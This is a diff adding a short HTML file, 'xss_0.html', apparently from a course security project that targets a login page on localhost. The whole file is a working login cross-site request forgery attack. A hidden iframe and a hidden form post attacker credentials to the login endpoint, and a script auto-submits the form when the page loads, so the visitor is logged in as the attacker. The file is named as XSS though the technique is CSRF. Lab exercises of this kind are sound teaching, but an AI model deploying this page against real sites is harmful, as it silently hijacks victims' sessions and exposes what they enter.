@@ -1,0 +1,18 @@
+xss_0.html
+
+<html>
+
+    <iframe name="somename", style="display: none"></iframe>
+
+    <form id="thesame", target="somename", action="http://localhost/project2/login", method="post", style="display: none">
+        <input name="username" value="attacker">
+        <input name="password" value="l33th4x">
+        
+    </form>
+    <script>
+        document.getElementById("thesame").submit();
+
+    </script>
+
+
+</html> 
